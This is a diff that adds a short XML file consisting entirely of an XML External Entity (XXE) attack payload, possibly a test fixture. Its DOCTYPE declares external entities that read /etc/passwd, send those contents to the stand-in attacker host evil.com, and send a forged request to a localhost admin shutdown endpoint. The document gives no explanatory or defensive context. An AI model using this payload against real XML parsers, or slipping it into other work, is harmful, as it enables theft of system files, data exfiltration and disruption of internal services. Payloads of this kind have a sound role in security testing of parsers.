@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxepasswords SYSTEM "file:///etc/passwd" >
+  <!ENTITY xxedownload SYSTEM "evil.com/save.php?file=&xxepasswords;" >
+  <!ENTITY xxecsrf SYSTEM "http://localhost:8085/admin/shutdown" >
+  ]>
+<foo>&xxepasswords;</foo>
